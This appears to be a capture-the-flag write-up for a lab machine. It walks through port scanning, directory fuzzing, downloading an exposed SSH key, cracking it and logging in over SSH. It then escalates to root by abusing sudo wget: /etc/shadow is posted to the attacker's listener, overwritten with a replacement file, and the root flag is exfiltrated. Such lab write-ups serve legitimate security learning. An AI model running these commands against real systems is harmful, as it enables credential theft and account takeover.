@@ -1,0 +1,215 @@
+## Target IP: `10.10.72.60`
+
+---
+
+### Nmap Scan
+
+```bash
+sudo nmap -sC -sV -T4 -O 10.10.72.60 -oN nmap_scan.txt
+```
+
+**Open Ports:**
+
+| Port | Service | Version |
+| --- | --- | --- |
+| 22 | SSH | OpenSSH 7.2p2 |
+| 80 | HTTP | Apache 2.4.18 |
+
+---
+
+### Web Enumeration
+
+- Apache default page
+- Page source reveals comment:
+
+```html
+<!-- Jessie don't forget to udate the webiste -->
+```
+
+---
+
+### Directory Brute Force (Working Command)
+
+Initial command:
+
+```bash
+ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 100 -ic -s -r -o dirbustresults.txt -u [http://10.10.72.60/FUZZ](http://10.10.9.161:8080/FUZZ)
+```
+
+Initial command didn’t yield useful results. Switched to this:
+
+```bash
+ffuf -u http://10.10.72.60/FUZZ -w /usr/share/wordlists/dirb/common.txt -c --recursion
+```
+
+- `u`: target URL
+- `w`: wordlist
+- `c`: colorized output
+- `-recursion`: automatically scan discovered directories (this helped a lot)
+
+**Discovered:**
+
+- `/sitemap/`
+    - `/images/`
+    - `/.ssh/` ← Important
+
+---
+
+### Gaining Access – Private Key in `.ssh/`
+
+Found `id_rsa` in `.ssh` folder:
+
+```bash
+wget http://10.10.72.60/sitemap/.ssh/id_rsa
+```
+
+Converted key for password cracking:
+
+```bash
+ssh2john id_rsa > sshkey.text
+john --wordlist=/usr/share/wordlists/rockyou.txt sshkey.text
+```
+
+**Result:**
+
+No password → can use key directly
+
+SSH in with:
+
+```bash
+sudo ssh -i id_rsa jessie@10.10.72.60
+```
+
+---
+
+### User Flag
+
+```bash
+cd ~/Documents
+cat user_flag.txt
+# → [REDACTED]
+```
+
+---
+
+### Privilege Escalation – Sudo Permissions
+
+```bash
+sudo -l
+```
+
+**Result:**
+
+```
+(ALL : ALL) ALL
+(root) NOPASSWD: /usr/bin/wget
+```
+
+We don’t know Jessie’s password, so using `sudo wget` without password is our path to root.
+
+---
+
+### Failed Wget Method (GTFOBins)
+
+Attempted:
+
+```bash
+TF=$(mktemp)
+chmod +x $TF
+echo -e '#!/bin/sh\n/bin/sh 1>&0' >$TF
+sudo wget --use-askpass=$TF 0
+```
+
+→ Didn’t work for me (didn’t for the writeup author either)
+
+---
+
+### Working Wget Privilege Escalation (Manual `/etc/shadow` Replacement)
+
+### Step 1 – Dump `/etc/shadow`
+
+Start a Netcat listener on your local machine:
+
+```bash
+nc -lvnp 4444
+```
+
+Then on the target machine:
+
+```bash
+sudo /usr/bin/wget --post-file=/etc/shadow <your-ip>:4444
+```
+
+Copy the output from Netcat into a local file.
+
+---
+
+### Step 2 – Modify Root Password
+
+Generate a new root password hash using:
+
+```bash
+openssl passwd -6 -salt 'salt' 'password'
+```
+
+Replace the `root:` line in the copied `/etc/shadow` with your new password hash.
+
+Example:
+
+```
+root:$6$salt$...rest-of-hash...:18195:0:99999:7:::
+```
+
+Save as `shadow.txt`.
+
+---
+
+### Step 3 – Host and Upload Modified Shadow File
+
+Start a local web server:
+
+```bash
+python3 -m http.server 8000
+```
+
+Then upload to target system (replaces shadow file):
+
+```bash
+sudo /usr/bin/wget http://<your-ip>:8000/shadow.txt -O /etc/shadow
+```
+
+---
+
+### Step 4 – Root Access
+
+Tried:
+
+```bash
+su root
+```
+
+→ **Did not work.**
+
+---
+
+### Alternative Method – Dumping Root Flag Directly
+
+Tried to extract `root.txt`:
+
+```bash
+sudo /usr/bin/wget --post-file=/root/root.txt <your-ip>:4444
+```
+
+→ Didn’t work
+
+Then tried:
+
+```bash
+sudo /usr/bin/wget --post-file=/root/root_flag.txt <your-ip>:4444
+```
+
+→ **Success**
+
+**Root Flag:**
+
+`[REDACTED]`
